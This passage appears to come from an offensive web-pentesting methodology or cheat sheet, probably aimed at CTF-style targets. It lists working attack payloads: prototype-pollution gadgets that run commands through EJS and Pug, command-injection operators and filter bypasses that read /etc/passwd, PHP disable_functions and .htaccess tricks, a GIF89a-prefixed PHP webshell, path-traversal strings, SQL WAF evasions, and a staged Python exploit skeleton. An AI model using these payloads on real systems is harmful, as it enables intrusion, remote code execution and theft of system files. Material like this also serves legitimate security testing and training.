Unsafe recursive merge or deep-copy functions allow attackers to inject properties into Object.prototype, affecting all objects in the application.

15.9.1 Discovery

  • Find unsafe merge/extend functions in source:
    • grep -rn "merge\|assign\|extend\|clone\|deepCopy" src/
    • Check for custom recursive merge implementations
    • Known vulnerable libraries: lodash <4.17.12, jQuery <3.4.0
  • Black-box detection:
    • POST JSON: {{"__proto__": {{"polluted": true}}}}
    • Check if the property appears on unrelated objects in subsequent responses
    • Also try: {{"constructor": {{"prototype": {{"polluted": true}}}}}}

15.9.2 Exploitation

  • EJS template engine gadget:
    • {{"__proto__": {{"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').execSync('id');//"}}}}
    • Pollutes the EJS outputFunctionName option, injecting code into the compiled template
  • Pug template engine gadget:
    • {{"__proto__": {{"block": {{"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}}}}
  • Handlebars template engine gadget:
    • {{"__proto__": {{"pendingContent": "<script>...</script>"}}}}
    • Injects content into Handlebars template compilation
  • child_process.spawn shell gadget:
    • {{"__proto__": {{"shell": true}}}}
    • Makes all subsequent child_process.spawn calls use a shell, enabling command injection in arguments

15.10 Command Injection & Code Execution

Test every user input that reaches an OS command or code evaluation function.

15.10.1 Sink Identification

  • PHP command execution sinks:
    • system(), exec(), passthru(), shell_exec(), popen(), proc_open()
    • Backtick operator: `command`
    • Code evaluation: eval(), assert(), preg_replace() with /e modifier
  • Python command execution sinks:
    • os.system(), subprocess.call(), subprocess.Popen()
    • Code evaluation: eval(), exec(), compile()
  • Node.js command execution sinks:
    • child_process.exec(), child_process.execSync(), child_process.spawn()
    • Code evaluation: eval(), Function(), vm.runInNewContext()
  • Test basic injection operators:
    • Separator: ; id, | id, || id, & id, && id
    • Newline: %0a id, %0d%0a id
    • Backtick: `id`, $(id)

15.10.2 Filter Bypass Techniques

  • PHP-specific evasion:
    • String concatenation: "sys"."tem" passes to call_user_func()
    • Reverse: strrev("metsys") → system
    • Base64: base64_decode("c3lzdGVt") → system
    • Variable variables: $a="sys"; $b="tem"; $c=$a.$b; $c("id")
  • Whitespace bypass:
    • $IFS as space substitute in bash: cat$IFS/etc/passwd
    • Tab: %09
    • Brace expansion: {{cat,/etc/passwd}}
  • Character blacklist bypass:
    • Wildcard: /???/??t /???/p??s?d = cat /etc/passwd
    • Hex in bash: $'\\x63\\x61\\x74' = cat

# Character blacklist bypass

$'\x63\x61\x74'            # hex in bash → cat

15.10.3 PHP-Specific Bypasses

  • Bypass disable_functions via mail():
    • mail("", "", "", "", "-X/var/www/html/shell.php")
    • The -X flag writes the mail log to the specified file — inject PHP code in the body
  • .htaccess injection for execution:
    • AddType application/x-httpd-php .jpg — makes .jpg files execute as PHP
    • Upload the .htaccess via file upload or other write primitive
  • PHP eval filter bypass (Dolibarr-style):
    • When eval() filters function names but allows expressions
    • Use variable functions: $f="system"; $f("id")
    • Use call_user_func(): call_user_func("system", "id")

15.11 File Upload & LFI to RCE

Upload a webshell or chain a local file inclusion to achieve code execution.

15.11.1 Upload Bypass

  • Extension bypass techniques:
    • Alternative extensions: .php5, .phtml, .pht, .phps, .phar
    • Null byte (legacy): shell.php%00.jpg
    • Double extension: shell.php.jpg, shell.jpg.php
    • Case variation: .pHp, .PhP
  • MIME type bypass:
    • Change Content-Type to image/jpeg or image/png
    • Intercept with Burp and modify after the browser sets it
  • Magic bytes injection:
    • GIF89a;<?php system($_GET['c']);?> — passes magic-byte and file-type checks
    • Prepend PNG/JPEG header bytes for binary checks
  • .htaccess injection:
    • Upload .htaccess containing AddType application/x-httpd-php .xxx
    • Then upload shell.xxx — Apache executes it as PHP

15.11.2 LFI Exploitation

  • Basic path traversal:
    • ../../../../etc/passwd
    • Stripping bypass: ....//....//etc/passwd
    • URL-encoded: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
    • Double-encoded: %252e%252e%252f

15.12 WAF Bypass

When a WAF blocks your payloads, use encoding tricks, alternate syntax, and protocol-level bypasses.

15.12.1 SQLi WAF Bypass

  • Case and comment tricks:
    • Case variation: SeLeCt, uNiOn
    • Inline comments: SE/**/LECT, UN/**/ION
    • MySQL version comments: SELECT/*!32302 1*/
  • Whitespace alternatives:
    • Tab: %09, newline: %0a, carriage return: %0d
    • Parentheses as separators: SELECT(username)FROM(users)
  • Encoding bypasses:
    • Double encoding: %2527 decodes to %27 then '
    • Unicode: %u0027 for single quote
    • Hex: 0x61646d696e for string admin

15.13 Exploit Scripting

Chain all findings into a single Python exploit script that achieves the objective end-to-end.

15.13.1 Python Exploit Skeleton

  • Set up the script structure:
    • import requests, sys, re, urllib3
    • urllib3.disable_warnings()
    • s = requests.Session()
    • s.verify = False
    • s.proxies = {{"http": "http://127.0.0.1:8080"}} for Burp interception during dev
  • One function per exploit stage:
    • Stage 1: authenticate() — get a session or bypass auth
    • Stage 2: exploit() — trigger the vulnerability
    • Stage 3: post_exploit() — extract data or get shell
  • Argument handling at the top:
    • if len(sys.argv) != 3: print(f"Usage: {{sys.argv[0]}} <target> <lhost>"); sys.exit(1)
    • TARGET = sys.argv[1]
    • LHOST = sys.argv[2]
  • Main execution flow:
    • if __name__ == "__main__":
    • Call each stage function in order
    • Print status messages for each stage
    • Handle errors gracefully with try/except
#!/usr/bin/env python3
import requests, sys, re, urllib3
urllib3.disable_warnings()

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <target> <lhost>")
    sys.exit(1)

TARGET = sys.argv[1]
LHOST  = sys.argv[2]
s = requests.Session()
s.verify = False
s.proxies = {"http": "http://127.0.0.1:8080"}   # Burp

def authenticate():
    print("[*] Stage 1 — Authenticating...")
    r = s.post(f"{TARGET}/login", data={"user":"admin","pass":"password"})
    assert "dashboard" in r.text, "[-] Auth failed"
    print("[+] Authenticated")

def exploit():
    print("[*] Stage 2 — Triggering vulnerability...")
    payload = "PAYLOAD_HERE"
    r = s.get(f"{TARGET}/vuln?param={payload}")
    print(f"[+] Exploit sent — status {r.status_code}")

def post_exploit():
    print("[*] Stage 3 — Post-exploitation...")
    r = s.get(f"{TARGET}/flag.txt")
    print(f"[+] Flag: {r.text.strip()}")

if __name__ == "__main__":
    try:
        authenticate()
        exploit()
        post_exploit()
    except Exception as e:
        print(f"[-] Failed: {e}")
        sys.exit(1)
